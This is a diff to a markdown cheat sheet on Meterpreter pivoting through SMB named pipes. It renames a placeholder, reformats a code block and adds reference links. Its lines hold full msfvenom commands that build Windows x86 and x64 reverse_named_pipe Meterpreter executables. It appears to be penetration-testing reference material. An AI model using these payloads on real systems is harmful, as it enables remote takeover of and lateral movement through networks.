@@ -14,7 +14,7 @@
 
 - Specify the compromised windows host with `pipehost`
 
-`$ msfvenom -p windows/meterpreter/reverse_named_pipe pipehost=<compromised_target_IP> pipename=<PIPENAME> -f exe -o met-x86.exe`
+`$ msfvenom -p windows/meterpreter/reverse_named_pipe pipehost=<compromised_computer_IP> pipename=<PIPENAME> -f exe -o met-x86.exe`
 
 2. x86-64 (64-bit) Payloads
 
@@ -26,7 +26,9 @@
 
 - Specify the compromised windows host with `pipehost`
 
-`$ msfvenom -p windows/x64/meterpreter/reverse_named_pipe pipehost=<compromised_target_IP> pipename=<PIPENAME> -f exe -o met-x64.exe`
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_named_pipe pipehost=<compromised_computer_IP> pipename=<PIPENAME> -f exe -o met-x64.exe
+```
 
 ## VNC
 
@@ -50,3 +52,7 @@
 - [Metasploit Documentation: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
 
 - [BorderGate: Lateral Movement With Named Pipes](https://www.bordergate.co.uk/lateral-movement-with-named-pipes/)
+
+- [Nagarro Security: SMB NamedPipe Pivoting Meterpreter](https://nagarrosecurity.com/blog/smb-named-pipe-pivoting-meterpreter)
+
+- [Peter Gombos: SMB Named Pipe Pivoting in Meterpreter](https://medium.com/@petergombos/smb-named-pipe-pivoting-in-meterpreter-462580fd41c5)
